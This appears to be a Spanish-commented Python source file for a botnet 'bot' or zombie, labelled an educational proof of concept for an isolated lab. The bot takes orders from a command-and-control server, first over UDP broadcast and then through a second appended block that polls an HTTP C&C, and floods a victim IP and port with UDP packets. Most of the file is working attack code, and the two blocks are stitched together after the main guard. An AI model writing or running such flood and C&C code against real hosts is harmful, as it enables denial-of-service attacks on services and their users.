#!/usr/bin/env python3
"""
Bot / zombie - PoC educativa de botnet.

Escucha ordenes del C&C por UDP broadcast. Cuando recibe una orden
(IP, puerto, duracion), lanza un flood UDP contra la victima durante
el tiempo indicado.

Uso solo en un laboratorio aislado y controlado.
"""
import socket
import time

from victima import PUERTO

# Puerto donde escuchamos las ordenes del C&C (debe coincidir con cc.py)
PUERTO_CC = 5000

# Tamano del paquete que mandamos a la victima
PAYLOAD = b"X" * 1024



def atacar(ip_victima, puerto_victima, duracion):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    fin = time.time() + duracion
    enviados = 0

    print(f"[BOT] Atacando {ip_victima}:{puerto_victima} durante {duracion}s...")
    while time.time() < fin:
        try:
            s.sendto(PAYLOAD, (ip_victima, puerto_victima))
            enviados += 1
        except OSError:
            # Si la red se satura, seguimos intentando
            pass
    s.close()
    print(f"[BOT] Ataque terminado. Paquetes enviados: {enviados}")


def escuchar():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Permite que varios bots en la misma maquina usen el puerto (pruebas)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # Escuchamos en todas las interfaces, en el puerto del C&C
    s.bind(("", PUERTO_CC))

    print(f"[BOT] Escuchando ordenes del C&C en el puerto {PUERTO_CC}...")
    while True:
        datos, origen = s.recvfrom(1024)
        try:
            ip, puerto, duracion = datos.decode().split(";")
            print(f"[BOT] Orden recibida de {origen[0]}: {ip}:{puerto} ({duracion}s)")
            atacar(ip, int(puerto), int(duracion))
        except ValueError:
            print(f"[BOT] Orden invalida ignorada: {datos!r}")


if __name__ == "__main__":
    escuchar()

import time, requests

CC = "http://localhost:8000"
BOT_ID = "bot1"

# registro al arrancar
requests.post(f"{CC}/registro", json={"id": BOT_ID})

def ejecutar(orden):
    tipo = orden.get("tipo") #"ataque"
    params = orden.get("parametros", {})     # {"ip": "x", "puerto": ..., "duracion": 2000}
    ip = params.get("ip")
    puerto = params.get("puerto")
    duracion = params.get("duracion")
    # aquí se decide qué se hace en cada tipo de orden
    if tipo == "ataque":
        atacar(ip, puerto, duracion)
    # elif tipo == "...":
    #     ...

while True:
    r = requests.get(f"{CC}/ordenes/{BOT_ID}")
    orden = r.json().get("orden")
    if orden:
        ejecutar(orden)
    time.sleep(5)